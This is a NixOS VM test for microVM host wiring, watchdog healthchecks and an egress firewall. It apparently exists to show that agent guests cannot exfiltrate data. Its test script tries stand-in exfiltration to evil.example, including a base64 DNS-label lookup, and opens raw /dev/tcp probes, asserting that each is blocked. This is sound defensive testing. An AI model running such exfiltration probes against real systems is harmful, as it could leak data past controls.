# vm-microvm: research-agent microvm unit installation + agenix wiring.
#
# Asserts:
#   - install-microvm-research-agent.service exists and runs
#   - microvm@research-agent.service template lands in /etc/systemd/system
#   - /var/lib/research-agent/vm-ssh (host-side persisted ssh-host-keys
#     share) is created via systemd.tmpfiles, owner root mode 700
#   - /var/lib/research-agent/tool-cache/{prv,bolagsverket} (persistent
#     jail tool-cache share) created via systemd.tmpfiles, 0777 jonathan
#   - the guest's egress policy AT RUNTIME (nodes `agent` + `upstream`):
#     the agent node imports the very module the guest imports
#     (modules/nixos/research-agent-egress.nix) and resolves through a
#     fake upstream that serves api.ebay.com's real CNAME-chain shape
#     onto an "edge" address the test rotates. Asserted: a freshly
#     rotated address is connectable as soon as the agent resolves it;
#     an address the resolver never handed out is not, even for an
#     allowlisted name; an unlisted name (A, AAAA, PTR) is answered
#     NXDOMAIN by the agent's own resolver and the upstream never sees
#     the query (no DNS-label exfiltration); no guest process but
#     dnsmasq can query the upstream directly.
#
# Nested-VM gate: starting microvm@research-agent.service would require
# nested KVM in the outer test QEMU. Some CI / dev hosts don't expose
# /dev/kvm to nested guests, so this lane asserts that the module
# evaluates and its systemd unit landed. Full boot+ssh+egress smoke
# lives in interactive `nix run .#feature-vm` per the SessionStart
# HARD RULE.
#
# Run: nix build .#checks.x86_64-linux.vm-microvm -L
{ pkgs, inputs }:

let
  lib = pkgs.lib;
in
pkgs.testers.runNixOSTest {
  name = "vm-microvm";
  skipTypeCheck = true;

  nodes.dellan = { config, ... }: {
    imports = [
      inputs.agenix.nixosModules.default
      inputs.agenix-rekey.nixosModules.default
      inputs.home-manager.nixosModules.home-manager
      inputs.microvm.nixosModules.host
      ../hosts/dellan/default.nix
      ../modules/common.nix
    ];

    # Strip the laptop's real hardware/disk config — virtualisation module
    # provides a virtio rootfs and the test framework boots without a
    # bootloader.
    disabledModules = [ ../hosts/dellan/hardware-configuration.nix ];

    boot.loader.systemd-boot.enable = lib.mkForce false;
    boot.loader.efi.canTouchEfiVariables = lib.mkForce false;

    home-manager = {
      useGlobalPkgs = true;
      useUserPackages = true;
      # This lane builds its own home-manager block rather than going
      # through tests/lib/common.nix, so it needs the same specialArg the
      # two builders there pass. home/aggregator-embed.nix uses it in
      # `imports`, and a module argument resolved from `_module.args`
      # during import evaluation is an infinite recursion.
      extraSpecialArgs = { inherit (inputs) aggregator-src; };
      users.jonathan = import ../home/jonathan-linux.nix;
    };

    users.users.jonathan = {
      linger = true;
      initialPassword = lib.mkForce "test";
    };

    virtualisation = {
      memorySize = 4096;
      cores = 2;
      diskSize = 8192;
    };

    # microvm.nix test-mode overrides. The production dellan config tells
    # microvm.vms.research-agent to virtiofs-share three host dirs that
    # don't exist inside this nested test VM. Without stubs, virtiofsd
    # blocks ~5min waiting for sources and pushes multi-user.target
    # behind its timeout. We also disable the inner VM start: this lane
    # asserts unit *installation*, not boot. Full boot lives in
    # `nix run .#feature-vm`.
    systemd.tmpfiles.rules = [
      "d /home/jonathan/Repos 0755 jonathan users -"
      "d /home/jonathan/Repos/research-agent 0755 jonathan users -"
      "d /home/jonathan/Repos/research-agent/reports 0755 jonathan users -"
    ];
    systemd.services."install-microvm-research-agent".wantedBy =
      lib.mkForce [ ];
    systemd.services."microvm@research-agent".wantedBy = lib.mkForce [ ];
    systemd.services."microvm-virtiofsd@research-agent".wantedBy =
      lib.mkForce [ ];
    # Same stubs for the scraper sibling VM. This lane asserts unit
    # installation only; interactive boot lives in `nix run .#feature-vm`.
    systemd.services."install-microvm-scraper".wantedBy = lib.mkForce [ ];
    systemd.services."microvm@scraper".wantedBy = lib.mkForce [ ];
    systemd.services."microvm-virtiofsd@scraper".wantedBy = lib.mkForce [ ];
  };

  # The research-agent guest's egress policy, run for real. Same module
  # the guest imports; only the upstream resolver differs (the guest's is
  # SLIRP's 10.0.2.3). IPv6 off as in the guest.
  nodes.agent = { nodes, pkgs, ... }: {
    imports = [ ../modules/nixos/research-agent-egress.nix ];
    researchAgent.egress.upstreamDns = nodes.upstream.networking.primaryIPAddress;
    networking.enableIPv6 = false;
    environment.systemPackages = [ pkgs.curl pkgs.dig ];
  };

  # The scraper guest's egress policy, run for real: same module the
  # scraper guest imports, on SLIRP's guest address. The API port is open
  # inbound as in the guest, with a stub listener.
  nodes.scraper = { pkgs, ... }: {
    imports = [ ../modules/nixos/scraper-egress.nix ];
    networking.enableIPv6 = false;
    networking.interfaces.eth1.ipv4.addresses = lib.mkAfter [
      { address = "10.0.2.15"; prefixLength = 24; }
      { address = "203.0.113.20"; prefixLength = 24; }
    ];
    networking.firewall.allowedTCPPorts = [ 8000 ];
    environment.systemPackages = [ pkgs.curl pkgs.dig ];
    systemd.services.fake-scraper-api = {
      wantedBy = [ "multi-user.target" ];
      script = ''
        mkdir -p /srv/api && echo api-ok > /srv/api/index.html
        exec ${pkgs.python3}/bin/python3 -m http.server 8000 --bind 0.0.0.0 --directory /srv/api
      '';
    };
  };

  # Stands in for "the internet": an authoritative-enough resolver plus a
  # TCP :443 listener on several addresses. api.ebay.com is served with
  # its real shape — a CNAME chain whose final A record (the Akamai edge)
  # the test rewrites to simulate rotation. evil.example is not on the
  # allowlist. Plain HTTP on :443 is enough: the guest rule is
  # `tcp dport 443`, TLS is irrelevant to the firewall. log-queries is
  # the witness for "the upstream never saw it".
  nodes.upstream = { pkgs, ... }: {
    networking.firewall.enable = false;
    environment.systemPackages = [ pkgs.dig ];
    networking.interfaces.eth1.ipv4.addresses = lib.mkAfter ((map
      (n: { address = "192.168.1.${toString n}"; prefixLength = 24; })
      [ 10 11 12 13 ])
      # For node `scraper`: SLIRP's host gateway (= host loopback in prod)
      # and DNS, plus an address outside every private range standing in
      # for "a public web server".
      ++ [
        { address = "10.0.2.2"; prefixLength = 24; }
        { address = "10.0.2.3"; prefixLength = 24; }
        { address = "203.0.113.10"; prefixLength = 24; }
      ]);
    services.dnsmasq = {
      enable = true;
      resolveLocalQueries = false;
      settings = {
        no-resolv = true;
        no-hosts = true;
        addn-hosts = "/run/fake-dns/hosts";
        cname = [
          "api.ebay.com,global-api.ebaycdn.net"
          "global-api.ebaycdn.net,ebay-edge.akamaiedge.net"
        ];
        local-ttl = 1;
        log-queries = true;
      };
    };
    systemd.tmpfiles.rules = [ "d /run/fake-dns 0755 root root -" ];
    systemd.services.dnsmasq.preStart = lib.mkBefore ''
      printf '192.168.1.10 ebay-edge.akamaiedge.net\n192.168.1.12 evil.example\n' \
        > /run/fake-dns/hosts
    '';
    systemd.services.fake-cdn = {
      wantedBy = [ "multi-user.target" ];
      script = ''
        mkdir -p /srv/cdn && echo ok > /srv/cdn/index.html
        exec ${pkgs.python3}/bin/python3 -m http.server 443 --bind 0.0.0.0 --directory /srv/cdn
      '';
    };
  };

  testScript = { nodes, ... }: ''
    dellan.wait_for_unit("multi-user.target")

    # microvm.nix install-microvm-<name> oneshot exists and runs cleanly.
    # We disabled `wantedBy = [ multi-user.target ]` in the test
    # overrides, so trigger it explicitly to materialize the per-VM
    # files under /var/lib/microvms/<name>.
    dellan.succeed("systemctl start install-microvm-research-agent.service")
    dellan.succeed("test -d /var/lib/microvms/research-agent")
    dellan.succeed(
        "systemctl cat microvm@research-agent.service "
        "| grep -q 'Description='"
    )

    # The generated qemu runner must never pass exactly -m 2048: qemu's
    # microvm machine serves a corrupt DSDT when guest RAM ends exactly
    # at the 2 GiB boundary (microvm-nix/microvm.nix#171) and the guest
    # wedges pre-init, pinning a host core. Assert on the materialized
    # runner — the artifact qemu actually execs — not on the .nix source.
    dellan.fail(
        "grep -qE -- '-m 2048( |$)' "
        "/var/lib/microvms/research-agent/current/bin/microvm-run"
    )

    # Persisted vm-ssh state dir must be in place before the VM boots.
    # The host module's systemd.tmpfiles.rules are the load-bearing piece.
    dellan.succeed("test -d /var/lib/research-agent/vm-ssh")
    perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/research-agent/vm-ssh"
    ).strip()
    assert perms == "700 root", (
        f"vm-ssh dir perms expected '700 root', got {perms!r}"
    )

    # Persistent tool-cache dirs (PRV / Bolagsverket SQLite indexes,
    # shared RW into the jail). 0777 is the load-bearing part: writes
    # from inside the bwrap --unshare-user jail arrive as a non-owner
    # uid, so anything tighter breaks index builds (same empirical
    # reason run-agent.sh chmods its report file 666).
    for sub in ["prv", "bolagsverket"]:
        perms = dellan.succeed(
            f"stat -c '%a %U' /var/lib/research-agent/tool-cache/{sub}"
        ).strip()
        assert perms == "777 jonathan", (
            f"tool-cache/{sub} perms expected '777 jonathan', got {perms!r}"
        )

    # Health-check watchdog: the script must defer to operator-stopped
    # state cleanly, and the systemctl-restart command name must appear in the script body (a
    # rename of the microvm unit would silently break the watchdog).
    script_path = dellan.succeed(
        "systemctl cat research-agent-healthcheck.service "
        "| awk -F= '/^ExecStart=/{print $2}' | tr -d '\"'"
    ).strip()
    # Match the literal command issued on restart. --no-block keeps the
    # oneshot bounded (the unit's TimeoutStartSec is 30s); a regression
    # back to synchronous restart would let stuck activations stack
    # behind the 1-min timer.
    dellan.succeed(
        f"grep -q 'systemctl restart --no-block microvm@research-agent.service' {script_path}"
    )
    # Give-up latch: the watchdog must cap fruitless restarts (burst
    # counter + gave-up flag) and write the notification flag file the
    # user-session path unit watches. A regression to restart-forever
    # recreates the 2026-06-05 incident: a boot-wedged guest restart-
    # looped 62×/6h, silently pinning a host core the whole time.
    # Probe MUST pass `-t ed25519`, matching the guest's own hostKeys.
    # Without it, ssh-keyscan also probes rsa and ecdsa; the guest serves
    # neither, and those attempts hang until -T rather than failing
    # fast, so the probe intermittently fails against a healthy VM.
    # Measured 2026-07-31 on the live host: default scan 12/20 vs 18/20
    # with -t ed25519, driving 35-49 spurious restarts a day (321 in 8
    # days). The flag is derived from the guest's own
    # services.openssh.hostKeys, so this assertion also catches an
    # empty-list regression: the throw at eval time is the primary
    # guard, and `-t <empty> -p` would produce `-t -p 2223` after bash
    # collapses the double space, which ssh-keyscan answers with
    # "Unknown key type '-p'" and every probe fails unconditionally.
    for unit, port in (("research-agent-healthcheck", "2223"),
                       ("scraper-healthcheck", "2225")):
        probe = dellan.succeed(
            f"grep -ho 'ssh-keyscan[^|]*' "
            f"$(systemctl cat {unit}.service | sed -n 's/^ExecStart=//p')"
        )
        assert f"-t ed25519 -p {port}" in probe, (
            f"{unit} must scan only the ed25519 host key its guest serves, got: {probe}"
        )
        assert "-t  -p" not in probe and "-t -p" not in probe, (
            f"{unit} probe has empty -t argument (would fail every probe): {probe}"
        )

    dellan.succeed(f"grep -q 'restart-burst-count' {script_path}")
    dellan.succeed(f"grep -q 'GIVING UP' {script_path}")
    dellan.succeed(
        f"grep -q '/run/microvm-healthcheck-notify/research-agent' {script_path}"
    )
    # Offline gate: probe failures while the HOST is offline must not
    # count toward restarts/give-up (2026-07-07 false "VM DOWN"
    # incident). Precautionary since the guest stopped holding sshd
    # back on DNS; see research-agent-microvm-healthcheck.nix.
    dellan.succeed(f"grep -q 'host is offline' {script_path}")
    dellan.succeed(f"grep -q 'getent ahostsv4' {script_path}")
    # Busy gate: while a research call is dialing the VM the MCP keeps a
    # heartbeat fresh; the watchdog must NOT count a failed probe (and so
    # must not restart) while it's fresh — otherwise it kills the in-flight
    # research call (the 2026-07-30 mid-run-restart failure). Assert the
    # gate is wired and the shared /run dir is jonathan-writable so the
    # MCP can actually touch the heartbeat.
    dellan.succeed(f"grep -q '/run/research-agent/active' {script_path}")
    dellan.succeed(f"grep -q 'a research call is active' {script_path}")
    dellan.succeed("test -d /run/research-agent")
    aperms = dellan.succeed("stat -c '%a %U' /run/research-agent").strip()
    assert aperms == "755 jonathan", (
        f"/run/research-agent perms expected '755 jonathan', got {aperms!r}"
    )
    # Wedge-snapshot instrumentation: before the recovery restart destroys
    # the wedged qemu, the watchdog must capture the guest console (streamed
    # to the journal via the qemu stdio chardev) to a persistent, pruned
    # file — the only window the warm-reboot second-boot failure is still on
    # record. Assert the logic is wired and the persistent dir is root-only.
    dellan.succeed(f"grep -q 'snapshot_console' {script_path}")
    dellan.succeed(f"grep -q 'wedge-logs' {script_path}")
    dellan.succeed(
        f"grep -q 'journalctl -u microvm@research-agent.service' {script_path}"
    )
    dellan.succeed("test -d /var/lib/research-agent/wedge-logs")
    wperms = dellan.succeed(
        "stat -c '%a %U' /var/lib/research-agent/wedge-logs"
    ).strip()
    assert wperms == "700 root", (
        f"wedge-logs dir perms expected '700 root', got {wperms!r}"
    )
    # Notification chain: flag dir exists and is world-readable so the
    # user session can inotify it.
    notify_perms = dellan.succeed(
        "stat -c '%a %U' /run/microvm-healthcheck-notify"
    ).strip()
    assert notify_perms == "755 root", (
        f"notify flag dir perms expected '755 root', got {notify_perms!r}"
    )
    # Probe should treat operator-stopped microvm as a no-op (exit 0
    # silently) — otherwise an admin `systemctl stop microvm@...` would
    # be fought by the watchdog. The microvm unit is stopped in this
    # test (wantedBy mkForce []), so a fresh run must exit 0.
    dellan.succeed("systemctl start research-agent-healthcheck.service")

    # Count-file corruption MUST NOT brick the watchdog. Under `set -u`
    # without sanitization, non-numeric input would crash the
    # arithmetic and leave the script aborting forever each tick.
    # read_int must clamp garbage back to 0.
    dellan.succeed(
        "mkdir -p /run/research-agent-healthcheck "
        "&& printf 'abc\\n0\\n5garbage' > /run/research-agent-healthcheck/fail-count"
    )
    dellan.succeed("systemctl start research-agent-healthcheck.service")
    # Service must reach 'inactive' (oneshot exited 0), not 'failed'.
    rc = dellan.succeed(
        "systemctl is-failed research-agent-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"watchdog must survive corrupted state file; got is-failed={rc!r}"
    )

    # ---------------------------------------------------------------
    # scraper microvm — same shape of assertions as research-agent,
    # plus the bearer-token init service that gates both VMs.
    # ---------------------------------------------------------------
    dellan.succeed("systemctl start install-microvm-scraper.service")
    dellan.succeed("test -d /var/lib/microvms/scraper")

    # Every host forward of both VMs binds host loopback, never 0.0.0.0.
    # QEMU reads `hostfwd=tcp::P-:G` (empty address, microvm.nix's
    # default) as "all interfaces", which left the scraper API, both
    # sshds and through them the guests reachable from the LAN with only
    # the host firewall in the way. Asserted on the runner qemu execs.
    for vm, fwds in (("research-agent", ["2223-:22"]),
                     ("scraper", ["2225-:22", "8123-:8000"])):
        runner = f"/var/lib/microvms/{vm}/current/bin/microvm-run"
        found = dellan.succeed(f"grep -oE 'hostfwd=tcp:[^,]*' {runner} | sort -u").split()
        print(f"[diag] {vm} hostfwds: {found}")
        assert sorted(found) == sorted(f"hostfwd=tcp:127.0.0.1:{f}" for f in fwds), (
            f"{vm}: expected loopback-only hostfwds for {fwds}, got {found}"
        )
    dellan.succeed(
        "systemctl cat microvm@scraper.service | grep -q 'Description='"
    )

    # Persisted scraper state dirs must be in place before the VM boots.
    dellan.succeed("test -d /var/lib/scraper/vm-ssh")
    perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/scraper/vm-ssh"
    ).strip()
    assert perms == "700 root", (
        f"scraper vm-ssh dir perms expected '700 root', got {perms!r}"
    )

    # Bearer-token init service must exist and produce a token file when
    # invoked. The token is regenerated on every boot; consumers read it
    # via virtiofs on demand, so rotation = a single `systemctl restart`.
    dellan.succeed("test -d /var/lib/scraper-bearer")
    perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/scraper-bearer"
    ).strip()
    assert perms == "755 root", (
        f"scraper-bearer dir perms expected '755 root', got {perms!r}"
    )
    dellan.succeed("systemctl start scraper-bearer-init.service")
    dellan.succeed("test -s /var/lib/scraper-bearer/token")
    token_perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/scraper-bearer/token"
    ).strip()
    assert token_perms == "444 root", (
        f"scraper token file perms expected '444 root', got {token_perms!r}"
    )
    # Token shape: base64url, ~43 ASCII chars, no '=' / '+' / '/'.
    token_body = dellan.succeed(
        "cat /var/lib/scraper-bearer/token"
    ).strip()
    assert len(token_body) >= 32, (
        f"scraper token too short: got {len(token_body)} chars"
    )
    assert all(
        c.isalnum() or c in "-_" for c in token_body
    ), f"scraper token contains non-base64url chars: {token_body!r}"

    # Research-agent ↔ scraper egress allow rule is structurally inside
    # the guest VM's nftables ruleset, not visible from this outer test
    # node. The interactive `nix run .#feature-vm` lane covers end-to-end
    # reachability (render_shim posting to the scraper); skip a brittle
    # grep here.

    # ---------------------------------------------------------------
    # scraper healthcheck — mirror of research-agent watchdog.
    # ---------------------------------------------------------------
    scraper_script = dellan.succeed(
        "systemctl cat scraper-healthcheck.service "
        "| awk -F= '/^ExecStart=/{print $2}' | tr -d '\"'"
    ).strip()
    # Must restart the scraper unit (not research-agent's) on persistent
    # failure. A rename of the microvm unit would silently break this.
    dellan.succeed(
        f"grep -q 'systemctl restart --no-block microvm@scraper.service' {scraper_script}"
    )
    # Give-up latch + notify chain — mirror of the research-agent
    # assertions above.
    dellan.succeed(f"grep -q 'restart-burst-count' {scraper_script}")
    dellan.succeed(f"grep -q 'GIVING UP' {scraper_script}")
    dellan.succeed(
        f"grep -q '/run/microvm-healthcheck-notify/scraper' {scraper_script}"
    )
    # Probe operator-stopped microvm as a no-op (the scraper unit is
    # stopped in this test via wantedBy mkForce []), exit 0 silently.
    dellan.succeed("systemctl start scraper-healthcheck.service")
    rc = dellan.succeed(
        "systemctl is-failed scraper-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"scraper watchdog must survive operator-stopped VM; got is-failed={rc!r}"
    )
    # Corrupted state file must NOT brick the watchdog (read_int clamp).
    dellan.succeed(
        "mkdir -p /run/scraper-healthcheck "
        "&& printf 'abc\\n0\\n5garbage' > /run/scraper-healthcheck/fail-count"
    )
    dellan.succeed("systemctl start scraper-healthcheck.service")
    rc = dellan.succeed(
        "systemctl is-failed scraper-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"scraper watchdog must survive corrupted state; got is-failed={rc!r}"
    )

    # ---------------------------------------------------------------
    # research-agent guest egress, at runtime (nodes agent + upstream).
    # ---------------------------------------------------------------
    upstream.start()
    agent.start()
    upstream.wait_for_unit("dnsmasq.service")
    upstream.wait_for_unit("fake-cdn.service")
    upstream.wait_for_open_port(443)
    agent.wait_for_unit("multi-user.target")
    agent.wait_for_unit("dnsmasq.service")
    agent.wait_for_unit("systemd-resolved.service")

    def set_edge(ip):
        # Rotate api.ebay.com's final A record, as Akamai does every few
        # seconds. local-ttl=1 + no caching on the agent side means the
        # next lookup sees it; sleep past the TTL anyway.
        upstream.succeed(
            f"printf '{ip} ebay-edge.akamaiedge.net\\n192.168.1.12 evil.example\\n' "
            "> /run/fake-dns/hosts && systemctl reload dnsmasq.service"
        )
        agent.sleep(2)

    def connect(name, extra=""):
        # %{remote_ip}: which address the agent actually reached.
        return agent.succeed(
            f"curl -sS -m 5 -o /dev/null -w '%{{remote_ip}}' {extra} http://{name}:443/"
        ).strip()

    def egress_set():
        return agent.succeed("nft list set inet filter research_allowed")

    # Nothing has been resolved yet, so nothing is allowed yet.
    print("[diag] set at boot:\n" + egress_set())
    assert "192.168.1." not in egress_set(), "egress set must start empty"

    # 1. Allowlisted name behind a CNAME chain: reachable, via the edge.
    ip = connect("api.ebay.com")
    assert ip == "192.168.1.10", f"expected edge 192.168.1.10, reached {ip!r}"

    # 2. The edge rotates to an address nobody has seen before. The
    #    boot-time/10-min-refresh design failed exactly here.
    set_edge("192.168.1.11")
    ip = connect("api.ebay.com")
    assert ip == "192.168.1.11", f"rotated edge not reached, got {ip!r}"

    # 3. Rotate again, but connect to the new address WITHOUT asking the
    #    resolver: allowlisted name or not, an address the resolver never
    #    handed out stays closed. Then resolve normally: open.
    set_edge("192.168.1.13")
    agent.fail(
        "curl -sS -m 5 -o /dev/null --resolve api.ebay.com:443:192.168.1.13 "
        "http://api.ebay.com:443/"
    )
    ip = connect("api.ebay.com")
    assert ip == "192.168.1.13", f"edge not opened by resolution, got {ip!r}"

    assert "192.168.1.10" in egress_set(), "resolved edge address must be in the egress set"

    # 4. Unlisted names never leave the guest as DNS. Control first: the
    #    upstream itself WOULD answer evil.example, so the NXDOMAIN below
    #    is the agent's resolver refusing to forward, not the upstream.
    upstream.succeed("dig +short @127.0.0.1 evil.example | grep -qx 192.168.1.12")
    for name in ["exfil-test.example.com", "c2VjcmV0.evil.example"]:
        agent.fail(f"getent ahostsv4 {name}")
        for qtype in ["A", "AAAA"]:
            status = agent.succeed(
                f"dig +time=3 +tries=1 @127.0.0.1 {name} {qtype} | grep -o 'status: [A-Z]*'"
            ).strip()
            assert status == "status: NXDOMAIN", f"{name} {qtype}: {status!r}"
    # Reverse lookup of an address /etc/hosts doesn't name (dnsmasq
    # answers the test nodes' own addresses from /etc/hosts, locally).
    status = agent.succeed(
        "dig +time=3 +tries=1 @127.0.0.1 -x 203.0.113.7 | grep -o 'status: [A-Z]*'"
    ).strip()
    assert status == "status: NXDOMAIN", f"PTR 203.0.113.7: {status!r}"
    upstream_log = upstream.succeed("journalctl -u dnsmasq.service --no-pager")
    # Positive control: the log does record what the agent forwarded.
    assert "query[A] api.ebay.com from" in upstream_log, "upstream query log not working"
    for leaked in ["exfil-test", "c2VjcmV0", "7.113.0.203.in-addr.arpa"]:
        assert leaked not in upstream_log, f"{leaked!r} reached the upstream resolver"
    # And the firewall still holds for the unlisted name's address even
    # if the agent already knows it.
    upstream.succeed("curl -sS -m 5 -o /dev/null http://192.168.1.12:443/")
    agent.fail(
        "curl -sS -m 5 -o /dev/null --resolve evil.example:443:192.168.1.12 "
        "http://evil.example:443/"
    )

    # 5. Port 53 is open only towards the configured upstream resolver,
    #    and only for dnsmasq. upstream's dnsmasq listens on every
    #    address, so .12:53 accepts TCP from an unfiltered node (dellan,
    #    same vlan) — not from the agent. A root process on the agent
    #    asking the upstream directly (skipping dnsmasq's name filter)
    #    gets no answer, even for an allowlisted name.
    dellan.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
    agent.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
    agent.fail("dig +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")
    agent.fail("dig +tcp +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")

    final = egress_set()
    print("[diag] set after test:\n" + final)
    assert "192.168.1.12" not in final, "unlisted name's address leaked into the egress set"

    # ---------------------------------------------------------------
    # scraper guest egress, at runtime (nodes scraper + upstream).
    # In prod 10.0.2.2 is SLIRP's gateway = the HOST's loopback; any new
    # connection there let rendered pages reach host-local services.
    # ---------------------------------------------------------------
    scraper.start()
    scraper.wait_for_unit("multi-user.target")
    scraper.wait_for_unit("fake-scraper-api.service")
    scraper.wait_for_open_port(8000)

    # Test VMs carry their OWN QEMU SLIRP NIC on eth0, in the same
    # 10.0.2.0/24 the scraper guest's rules name. Take it down on both
    # nodes so 10.0.2.x is reached over the test vlan (eth1), where
    # upstream plays SLIRP's gateway/DNS. Without this the 10.0.2.x checks
    # below would fail for routing reasons and prove nothing.
    for m in (scraper, upstream):
        m.succeed("ip link set eth0 down")
    scraper.succeed("ip route get 10.0.2.2 | grep -q 'dev eth1'")

    def scraper_get(url):
        return scraper.execute(f"curl -sS -m 5 -o /dev/null -w '%{{http_code}}' {url}")

    # Positive control first: the same listener on a non-private address
    # is reachable, so the failures below are the policy, not the network.
    rc, code = scraper_get("http://203.0.113.10:443/")
    assert rc == 0 and code == "200", f"public egress broken: rc={rc} code={code!r}"

    # Host gateway and private ranges: refused, whatever the port.
    for url in ["http://10.0.2.2:443/", "http://10.0.2.2:8123/",
                "http://192.168.1.10:443/"]:
        rc, code = scraper_get(url)
        assert rc != 0, f"scraper reached {url} (code {code!r}) — guest egress must refuse it"

    # SLIRP's DNS port stays reachable (the scraper resolves every URL it
    # renders) — and only that port: upstream also listens on :443 at
    # the same address, which must stay refused.
    scraper.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/10.0.2.3/53'")
    scraper.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/10.0.2.3/443'")

    # Inbound still works: the host's hostfwd arrives from 10.0.2.2, and
    # replies on that connection must not be caught by the output drop.
    out = upstream.succeed("curl -sS -m 5 --interface 10.0.2.2 http://10.0.2.15:8000/")
    assert out.strip() == "api-ok", f"inbound API via gateway broken: {out!r}"

    counters = scraper.succeed("nft list table ip scraper-egress")
    print("[diag] scraper-egress:\n" + counters)
    assert "packets 0 " not in counters, "reject rule never matched — test exercised nothing"

    # Non-vacuity: with the chain emptied, the very same gateway URL is
    # reachable — so the refusals above were the policy, not the network.
    scraper.succeed("nft flush chain ip scraper-egress output")
    rc, code = scraper_get("http://10.0.2.2:443/")
    assert rc == 0 and code == "200", f"control: gateway unreachable even without policy: rc={rc} code={code!r}"
  '';
}
